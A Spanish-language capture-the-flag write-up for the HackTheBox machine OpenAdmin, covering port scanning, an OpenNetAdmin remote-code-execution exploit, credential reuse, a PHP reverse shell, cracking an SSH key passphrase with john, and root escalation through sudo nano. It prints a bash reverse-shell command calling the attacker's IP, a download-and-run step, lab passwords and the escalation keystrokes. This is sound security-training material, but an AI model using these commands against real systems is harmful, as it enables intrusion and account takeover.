---
title: HTB OpenAdmin Write-up (Español)
tags: [HackTheBox]
image: /assets/images/OpenAdmin/1__iUvhxKVKR1HLGiQXZQEVYg.jpeg
published: true
banner: true
---

I cloned my writeup that was originally posted on [medium](https://medium.com/@5ubterranean/htb-openadmin-write-up-espa%C3%B1ol-9b29d4d36963)

OpenAdmin es una máquina basada en Linux que estuvo activa desde el 4 de Enero hasta el 2 de Marzo de 2020, en total tendremos que tomar control de 3 diferentes usuarios antes de poder tener acceso a root.  
Conseguiremos acceso inicial a través de una vulnerabilidad conocida en el sistema OpenNetAdmin que funciona en la máquina, luego de explorar los archivos a los que tenemos acceso encontraremos la contraseña del siguiente usuario, luego veremos que un tercer usuario está corriendo apache en un puerto que solo se puede acceder localmente, pero tenemos control sobre el directorio raiz de este, por lo que podremos subir una shell php y conseguir ejecución de comandos con ese tercer usuario, una vez el en tercer usuario extraeremos su clave privada de ssh, crackearmos la contraseña del archivo usando john y accederemos al este usuario a través de ssh, una vez ahí veremos que podemos ejecutar nano con privilegios de root sin ingresar una contraseña por lo que lo usaremos para elevar nuestros privilegios.

# Enumeración

Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.

```bash
masscan -e tun0 — rate=500 -p 0–65535 10.10.10.171  
nmap -sC -sV -p 80,22,59769 -Pn 10.10.10.171  
PORT      STATE SERVICE    VERSION  
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)  
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)  
|\_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)  
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))  
|\_http-server-header: Apache/2.4.29 (Ubuntu)  
|\_http-title: Apache2 Ubuntu Default Page: It works  
59769/tcp open  tcpwrapped  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
```

Empezamos por el puerto 80, usamos gobuster para ver que directorios hay disponibles dentro de su página:  
`gobuster dir -u http://10.10.10.171/ -w /usr/share/wordlists/dirb/common.txt` Esto nos devuelve 2 directorios “artwork” y “music”.  
Empezamos revisando `http://10.10.10.171/artwork`


![](/assets/images/OpenAdmin/1__5JFx__7A5RB03fgPbiL5vXg.png)


Tras revisarlo no encontramos nada interesante así que vamos a `http://10.10.10.171/music`

![](/assets/images/OpenAdmin/1__WOtUBgQkg1E6ESORmK__5MQ.png)


Si hacemos click en “Login” el sitio nos llevará a `http://10.10.10.171/ona/`

![](/assets/images/OpenAdmin/1__irAiBXTxNIHm__X7PE6wYKQ.png)


Luego de revisar el sitio nos damos cuenta que este sitio está corriendo [OpenNetAdmin](https://opennetadmin.com/), y como vemos en la imagen es la versión 18.1.1, así que usamos searchsploit para ver si encontramos alguna vulnerabilidad conocida.

![](/assets/images/OpenAdmin/1__brFYndnJEG986PQWaT1HWg.png)


# Ganando acceso

Usamos la vulnerabilidad disponible en [https://www.exploit-db.com/exploits/47691](https://www.exploit-db.com/exploits/47691) aunque para tener más control copiamos el payload a burp y probamos si funciona.

![](/assets/images/OpenAdmin/1__PPdxqoxd6tUMq1ECAODyuQ.png)
![](/assets/images/OpenAdmin/1__qqRTp8w3ducXDXVKbBJmPA.png)


Perfecto, para evitar problemas con las peticiones http creamos un archivo con una shell reversa en bash, lo llamaremos “rev.sh”, y su contenido será `bash -i >& /dev/tcp/10.10.14.148/54321 0>&1`.  
Iniciamos un servidor http con python 3:

![](/assets/images/OpenAdmin/1__vFOy70__3GUT2TF05yhO2rw.png)


Y enviamos una petición con burp que descargue nuestra shell y la envíe a bash para que se ejecute.

![](/assets/images/OpenAdmin/1__Snp3QNMa6o5n9do0uyEVIQ.png)


Y con esto tenemos nuestra shell inicial.

![](/assets/images/OpenAdmin/1__fJbhN2X5FGBEgSeHp2NBhQ.png)


# Movimiento lateral 1

El usuario con el que tenemos acceso es “www-data”, observamos que dentro de la máquina hay 2 usuarios disponibles “joanna” y “jimmy”, así que probablemente tendremos que ir a uno de ellos, empezamos buscando todos los archivos de configuración a los que tenemos acceso en busca de algunas credenciales, luego de un rato no encontramos con “database\_settings.inc.php” en el directorio `/opt/ona/www/local/config`.

![](/assets/images/OpenAdmin/1__FFhfbeieyO__iRvT0ftlZeQ.png)


Muy bien tenemos la contraseña de la base de datos, “n1nj4W4rri0R!”, pero resulta que está también es la contraseña del usuario “jimmy”, al cual podemos acceder usando `su jummy` (para hacer esto hay que estar dentro de una shell más interactiva, por lo que antes creamos una con el comando: `python3 -c “import pty;pty.spawn(‘/bin/bash’)”`).

![](/assets/images/OpenAdmin/1__N2k4tO958IyQMsjrgEVnvg.png)


# Movimiento lateral 2

En la etapa anterior habíamos enumerado la máquina con ayuda de [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) y habíamos observado dos cosas interesantes, primero que había un puerto que solo estaba escuchando localmente, el 52846, también estaba el 3306 pero ya que ese es de mysql no nos llamó la atención.

![](/assets/images/OpenAdmin/1__1ByFh__mE5vH5vQwTWHvt0g.png)


Y segundo que el usuario “joanna” era quien estaba corriendo el servicio de apache2 en la máquina.

![](/assets/images/OpenAdmin/1__SJaYYm0Mk4qGqhdMGZg8RQ.png)


De esto concluimos que joanna era quien estaba corriendo el servidor en el puerto 52846, ya que de ser quien corría el servidor en el puerto 80 habríamos conseguido acceso como ese usuario.

Después de explorar un rato encontramos que el directorio raíz del servidor apache se encuentra en `/var/www/internal` carpeta de la cual “jimmy” es dueño, por lo que creamos un archivo “.rev.php” y copiamos la reverse shell de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) (mientras hacíamos algunos pasos anteriores nuestra shell se cayó, pero ya que teníamos las credenciales de jimmy regresamos a través de ssh).

![](/assets/images/OpenAdmin/1__MULkKZJpzZaGYoX5cK__l__Q.png)


Ahora solo tenemos que iniciar nuestro listener en nuestra máquina atacante y hacer una petición a nuestra shell desde la máquina objetivo usando `curl 127.0.0.1:52846/.rev.php`.

![](/assets/images/OpenAdmin/1__BgA__V__lOyZIMu4MrcLV0ow.png)


Y tras esto conseguimos el archivo **_user.txt_**.

# Escalación de privilegios

Entramos a la carpeta “.ssh” de joanna y nos encontramos con sus llaves ssh.

![](/assets/images/OpenAdmin/1__TEbnQ6EdZGlE4iw9iMETGA.png)


Copiamos el contenido de su llave privada, id\_rsa (en este caso lo renombramos como “joanaid”), esta llave necesita una contraseña para ser usada, así que la convertimos a un formato que john pueda entender usando ssh2john, y procedemos a crackearla.

![](/assets/images/OpenAdmin/1__boQ756vYdGsX5iSWdojx0A.png)


Y la contraseña es “bloodninjas”, procedemos a conectarnos a través de ssh usando: `ssh -i joanaid joanna@10.10.10.171`.  
En el contexto anterior no podíamos usar “sudo” así que volvemos a revisar si tenemos alguna capacidad.

![](/assets/images/OpenAdmin/1__vq33eY0XNFdM8HO__5Cxeyw.png)


Bien, podemos usar nano para editar el archivo “/opt/priv”, revisamos si podemos usar esto para escalar privilegios consultando [gtfobins](https://gtfobins.github.io/gtfobins/nano/), y resulta que sí podemos, para hacerlos ejecutamos:

```
sudo nano /opt/priv  
Luego presionamos Ctrl + r y Ctrl + x  
reset; sh 1>&0 2>&0
```

Y con esto tendremos una shell con privilegios de root en la máquina, quizás no sea muy cómoda pero podríamos generar una nueva aunque a este punto ya no hace falta.

![](/assets/images/OpenAdmin/1__dSiwZS__gbQyqoNvgnJZrHg.png)


# Descargo de responsabilidad

Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.